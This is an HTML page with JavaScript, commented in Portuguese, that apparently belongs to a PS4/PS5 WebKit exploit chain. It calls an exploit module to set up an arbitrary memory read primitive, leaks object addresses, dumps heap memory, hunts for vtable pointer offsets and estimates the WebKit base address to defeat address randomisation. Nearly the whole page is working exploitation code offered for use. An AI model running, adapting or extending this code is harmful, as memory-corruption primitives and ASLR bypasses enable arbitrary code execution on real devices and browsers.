<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<title>PS4/PS5 WebKit Offset Scanner</title>
<style>
  body { font-family: ui-monospace, monospace; background:#111; color:#ddd; margin:16px; }
  h1,h2 { color:#8cf; }
  button { margin:4px 8px 4px 0; padding:6px 12px; }
  #log { white-space:pre-wrap; background:#1a1a1a; border:1px solid #333;
         padding:12px; max-height:70vh; overflow:auto; font-size:13px; }
  .ok   { color:#6f6; }
  .fail { color:#f66; }
  .info { color:#8cf; }
  .warn { color:#fc6; }
</style>
</head>
<body>
<h1>WebKit Offset Scanner (PS4 / PS5)</h1>
<p>Roda depois do primitivo estar instalado em <code>window.p</code>.</p>

<button id="btn-run">1. Rodar scanner completo</button>
<button id="btn-clear">Limpar log</button>

<div id="log"></div>

<script type="module">
// Ajuste os caminhos se os seus arquivos tiverem nomes/versão diferentes
import { establishPrimitive } from "./resources/core.js";
import { installWindowP }     from "./resources/mem.js";
import { int64 }              from "./resources/int64.js";

const logEl = document.getElementById("log");
function log(msg, cls = "") {
  const line = document.createElement("div");
  if (cls) line.className = cls;
  line.textContent = msg;
  logEl.appendChild(line);
  logEl.scrollTop = logEl.scrollHeight;
}
function clearLog() { logEl.innerHTML = ""; }

document.getElementById("btn-clear").onclick = clearLog;

// ---------------------------------------------------------------------------
// Utilitários de leitura (usam window.p depois de instalado)
// ---------------------------------------------------------------------------
function hex(n) {
  if (n instanceof int64) return "0x" + n.toString(16);
  if (typeof n === "number") return "0x" + (n >>> 0).toString(16);
  return String(n);
}

function read8(addr)  { return window.p.read8(addr); }
function read4(addr)  { return window.p.read4(addr); }
function leakval(obj) { return window.p.leakval(obj); }

// ---------------------------------------------------------------------------
// 1) Provar que o primitivo está vivo
// ---------------------------------------------------------------------------
function provePrimitive() {
  log("--- Prova do primitivo ---", "info");
  const ta = document.createElement("textarea");
  const cell = leakval(ta);
  log("leakval(textarea) = " + hex(cell));

  // Lê 0x40 bytes a partir da célula e mostra
  let dump = "";
  for (let i = 0; i < 0x40; i += 8) {
    const v = read8(cell.add32(i));
    dump += `  +0x${i.toString(16).padStart(2,"0")}: ${hex(v)}\n`;
  }
  log(dump);
  return cell;
}

// ---------------------------------------------------------------------------
// 2) Scanner do offset do ponteiro de vtable
//    No PS5 costuma ser +0x18; no PS4 você já viu +0x10.
//    Testamos vários candidatos e verificamos se o valor apontado
//    parece uma vtable (ponteiro canônico + alinhado).
// ---------------------------------------------------------------------------
function scanVtablePtrOffset(cell) {
  log("--- Scanner de offset do vtable pointer ---", "info");

  const candidates = [0x08, 0x10, 0x18, 0x20, 0x28, 0x30];
  const results = [];

  for (const off of candidates) {
    try {
      const maybeVtPtr = read8(cell.add32(off));
      // heurística: ponteiro de usuário, alinhado a 8, canônico (hi pequeno)
      const plausible =
        maybeVtPtr.hi <= 0xffff &&
        maybeVtPtr.low !== 0 &&
        (maybeVtPtr.low & 7) === 0;

      let firstSlot = null;
      let looksLikeVtable = false;
      if (plausible) {
        firstSlot = read8(maybeVtPtr);           // primeiro elemento da vtable
        looksLikeVtable =
          firstSlot.hi <= 0xffff &&
          firstSlot.low !== 0 &&
          (firstSlot.low & 0xf) === 0;           // código costuma ser 16-byte aligned
      }

      const mark = looksLikeVtable ? "OK" : (plausible ? "?" : "no");
      log(`  offset +0x${off.toString(16)} → vtPtr=${hex(maybeVtPtr)}  ` +
          `first=${firstSlot ? hex(firstSlot) : "n/a"}  [${mark}]`,
          looksLikeVtable ? "ok" : (plausible ? "warn" : ""));
      results.push({ off, vtPtr: maybeVtPtr, firstSlot, looksLikeVtable });
    } catch (e) {
      log(`  offset +0x${off.toString(16)} → erro: ${e.message}`, "fail");
    }
  }
  return results;
}

// ---------------------------------------------------------------------------
// 3) A partir de um vtPtr escolhido, tentar achar a base do WebKit
//    Estratégia simples: ler o primeiro slot da vtable e subtrair
//    vários RVAs candidatos (você preenche a lista com valores
//    conhecidos de firmwares próximas).
// ---------------------------------------------------------------------------
function tryFindWebKitBase(vtPtr, rvaCandidates) {
  log("--- Tentativa de base do WebKit ---", "info");
  const first = read8(vtPtr);
  log("vtable[0] = " + hex(first));

  for (const rva of rvaCandidates) {
    // first - rva
    const lo = (first.low - (rva >>> 0)) >>> 0;
    let hi = first.hi;
    if (lo > first.low) hi = (hi - 1) >>> 0;   // borrow
    const base = new int64(lo, hi);

    // heurística de módulo userland: página alinhada e faixa razoável
    const pageAligned = (base.low & 0x3fff) === 0;
    const inRange = base.hi >= 0x1 && base.hi <= 0x7;   // ajuste se necessário

    log(`  RVA 0x${rva.toString(16)} → base ${hex(base)}  ` +
        `aligned=${pageAligned} range=${inRange}`,
        (pageAligned && inRange) ? "ok" : "warn");
  }
}

// ---------------------------------------------------------------------------
// 4) Scanner genérico de ponteiros “interessantes” dentro da célula
// ---------------------------------------------------------------------------
function dumpInterestingPointers(cell, size = 0x80) {
  log("--- Ponteiros plausíveis na célula ---", "info");
  for (let i = 0; i < size; i += 8) {
    try {
      const v = read8(cell.add32(i));
      if (v.hi > 0 && v.hi <= 0xffff && (v.low & 7) === 0 && v.low !== 0) {
        log(`  +0x${i.toString(16).padStart(2,"0")}: ${hex(v)}`);
      }
    } catch (_) {}
  }
}

// ---------------------------------------------------------------------------
// Fluxo principal
// ---------------------------------------------------------------------------
async function runScanner() {
  clearLog();
  log("Iniciando…", "info");

  try {
    // 1. Estabelece o primitivo (mesmo caminho do exploit original)
    log("Chamando establishPrimitive()…");
    const carrier = await establishPrimitive({
      onEvent: (tag, detail) => log(`[core] ${tag} ${detail}`),
      maxAttempts: 30
    });
    log("Primitive OK", "ok");

    // 2. Instala window.p (sem promoção se quiser só o fake-cell)
    installWindowP(carrier, {
      promote: true,          // mude para false se a promoção estiver instável
      onEvent: (tag, detail) => log(`[mem] ${tag} ${detail}`)
    });
    log("window.p instalado", "ok");

    // 3. Provas e scans
    const cell = provePrimitive();
    dumpInterestingPointers(cell);
    const vtResults = scanVtablePtrOffset(cell);

    // Escolhe o melhor candidato automaticamente (primeiro que passou na heurística)
    const best = vtResults.find(r => r.looksLikeVtable);
    if (best) {
      log(`Melhor candidato de vtable offset: +0x${best.off.toString(16)}`, "ok");

      // Lista de RVAs de exemplo – SUBSTITUA pelos valores reais das firmwares
      // que você já conhece (ou de dumps públicos próximos da 13.42 / 9.xx etc.)
      const rvaCandidates = [
        0x0,          // só para ver o valor cru
        // 0x123456,  // exemplo – coloque RVAs conhecidos aqui
      ];
      tryFindWebKitBase(best.vtPtr, rvaCandidates);
    } else {
      log("Nenhum offset de vtable passou na heurística automática. " +
          "Olhe o dump e teste manualmente.", "warn");
    }

    log("Scanner terminou.", "info");
  } catch (e) {
    log("ERRO: " + e + "\n" + (e.stack || ""), "fail");
  }
}

document.getElementById("btn-run").onclick = runScanner;
</script>
</body>
</html>
